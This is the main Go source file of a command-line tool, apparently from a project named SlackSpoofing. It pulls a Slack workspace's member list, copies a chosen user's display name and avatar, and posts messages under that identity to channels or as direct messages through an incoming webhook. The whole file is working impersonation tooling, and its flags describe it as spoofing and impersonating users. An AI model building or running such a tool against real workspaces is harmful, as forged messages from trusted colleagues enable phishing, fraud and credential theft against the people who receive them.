package main

import (
	"fmt"
	"os"

	"github.com/ariary/SlackSpoofing/pkg/slackspoofing"
	"github.com/ariary/go-utils/pkg/color"
	"github.com/spf13/cobra"
)

func main() {
	var cfg slackspoofing.Config
	// direct message
	var dmCmd = &cobra.Command{Use: "dm",
		Short: "Spoof user visual identity to send direct messages (in Slackbot bot discussion channel)",
		Run: func(cmd *cobra.Command, args []string) {
			// Init
			slackspoofing.CheckConfig(&cfg, true)

			//retrieve avatar
			usersList, err := slackspoofing.GetUsersList(cfg)
			if err != nil {
				fmt.Println("error while retrieving users list:", err)
				os.Exit(92)
			}

			var avatarUrl, recipientID string
			for i := 0; i < len(usersList.Members); i++ {
				if avatarUrl != "" && recipientID != "" {
					message := slackspoofing.Message{Username: cfg.Username, Channel: recipientID, IconUrl: avatarUrl, Text: cfg.Message}
					if err := slackspoofing.PostMessage(cfg.WebhookUrl, message); err != nil {
						fmt.Println("error while posting direct message", err)
						os.Exit(92)
					}
					break
				}
				if usersList.Members[i].RealName == cfg.Recipient && recipientID == "" {
					fmt.Println(color.Green("recipient user " + cfg.Username + " found"))
					recipientID = usersList.Members[i].Id
				}
				if usersList.Members[i].RealName == cfg.Username && avatarUrl == "" {
					fmt.Println(color.Green("user " + cfg.Username + " found"))
					avatarUrl = usersList.Members[i].Profile.Image
				}
			}
			if avatarUrl == "" {
				fmt.Println(color.RedForeground("Failed to retrieve user: " + cfg.Username))
				os.Exit(92)
			}
			if recipientID == "" {
				fmt.Println(color.RedForeground("Failed to retrieve recipient user: " + cfg.Recipient))
				os.Exit(92)
			}

			fmt.Println("📨 Send direct message to", cfg.Recipient, "spoofing", cfg.Username)

		},
	}

	dmCmd.Flags().StringVarP(&cfg.Recipient, "recipient", "r", "", "specify recipient of direct message")

	//CMD ROOT
	var rootCmd = &cobra.Command{Use: "slackctl",
		Short: "Spoof user  identity to send messages in Slack",
		Run: func(cmd *cobra.Command, args []string) {
			// Init
			slackspoofing.CheckConfig(&cfg, false)

			//retrieve avatar
			usersList, err := slackspoofing.GetUsersList(cfg)
			if err != nil {
				fmt.Println("error while retrieving users list:", err)
				os.Exit(92)
			}

			var avatarUrl string
			for i := 0; i < len(usersList.Members); i++ {
				if usersList.Members[i].RealName == cfg.Username {
					fmt.Println(color.Green("user " + cfg.Username + " found"))
					avatarUrl = usersList.Members[i].Profile.Image
					message := slackspoofing.Message{Username: cfg.Username, Channel: cfg.Channel, IconUrl: avatarUrl, Text: cfg.Message}
					if err := slackspoofing.PostMessage(cfg.WebhookUrl, message); err != nil {
						fmt.Println("error while posting message", err)
						os.Exit(1)
					}
					break
				}
			}
			if avatarUrl == "" {
				fmt.Println(color.RedForeground("Failed to retrieve user: " + cfg.Username))
				os.Exit(92)
			}
			fmt.Println("📨 Send direct message in channel", cfg.Channel, "spoofing", cfg.Username)

		},
	}
	rootCmd.Flags().StringVarP(&cfg.Channel, "channel", "c", "", "specify channel")
	rootCmd.PersistentFlags().StringVarP(&cfg.Username, "username", "u", "", "specify username to impersonate")
	rootCmd.PersistentFlags().StringVarP(&cfg.BotToken, "token", "t", "", "specify bot token with users.identities scope")
	rootCmd.PersistentFlags().StringVarP(&cfg.WebhookUrl, "webhook", "w", "", "specify incoming webhook used to send message")
	rootCmd.PersistentFlags().StringVarP(&cfg.Message, "message", "m", "", "specify the message to send")

	rootCmd.AddCommand(dmCmd)
	rootCmd.Execute()

}
